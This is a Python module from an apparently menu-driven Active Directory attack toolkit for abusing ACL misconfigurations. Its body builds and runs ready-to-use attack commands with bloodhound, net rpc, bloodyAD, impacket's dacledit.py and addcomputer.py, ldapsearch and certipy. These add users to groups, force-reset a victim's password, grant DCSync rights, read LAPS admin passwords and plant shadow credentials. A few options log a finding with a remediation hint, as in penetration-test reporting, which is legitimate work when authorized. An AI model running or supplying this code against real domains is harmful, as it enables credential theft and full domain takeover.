"""
Module: ACL / ACE Abuse
Techniques: WriteDACL, GenericAll, GenericWrite, ForceChangePassword,
            AddMember, WriteOwner, DCSync rights, Shadow Credentials, LAPS
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("ACL / ACE ABUSE")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")
    base_dn = "DC=" + dom.replace(".", ",DC=")

    print("""
  [1]  Find ACL Misconfigs (bloodhound-ce-python)
  [2]  Add User to Group   (GenericAll / GenericWrite)
  [3]  Force Change Password
  [4]  Grant DCSync Rights (WriteDACL)
  [5]  Add Computer Account (MachineAccountQuota)
  [6]  Read LAPS Password
  [7]  Shadow Credentials  (msDS-KeyCredentialLink)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        run_cmd(f"bloodhound-ce-python -u {user} -p '{pw}' -d {dom} -dc DC01.{dom} -ns {dc} -c All --zip")
        info("Import ZIP into BloodHound → Shortest Paths to Domain Admins")

    elif c == "2":
        grp  = prompt("Target group")
        uadd = prompt("User to add")
        run_cmd(f"net rpc group addmem '{grp}' '{uadd}' -U {dom}\\\\{user}%{pw} -S {dc}")
        add_finding("GenericAll Group Abuse", "Critical",
                    f"Added {uadd} to {grp}", "Audit and tighten group ACLs")

    elif c == "3":
        victim = prompt("Victim username")
        newpw  = prompt("New password")
        run_cmd(f"bloodyAD --host {dc} -d {dom} -u {user} -p '{pw}' set password {victim} '{newpw}'")

    elif c == "4":
        run_cmd(f"{imp('dacledit.py')} -action write -rights DCSync -principal {user} -target-dn '{base_dn}' {dom}/{user}:'{pw}' -dc-ip {dc}")
        add_finding("DCSync Rights Granted", "Critical",
                    f"DCSync rights granted to {user}", "Audit DS-Replication ACEs on domain object")

    elif c == "5":
        comp = prompt("New computer name (without $)")
        cpw  = prompt("Computer password")
        run_cmd(f"{imp('addcomputer.py')} -computer-name '{comp}$' -computer-pass '{cpw}' {dom}/{user}:'{pw}' -dc-ip {dc}")

    elif c == "6":
        run_cmd(f"ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' -b '{base_dn}' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd cn")

    elif c == "7":
        target = prompt("Target user or computer account")
        run_cmd(f"certipy shadow auto -u {user}@{dom} -p '{pw}' -account '{target}' -dc-ip {dc}")
        add_finding("Shadow Credentials", "Critical",
                    f"Injected KeyCredentialLink on {target}", "Restrict writes to msDS-KeyCredentialLink")

    pause()
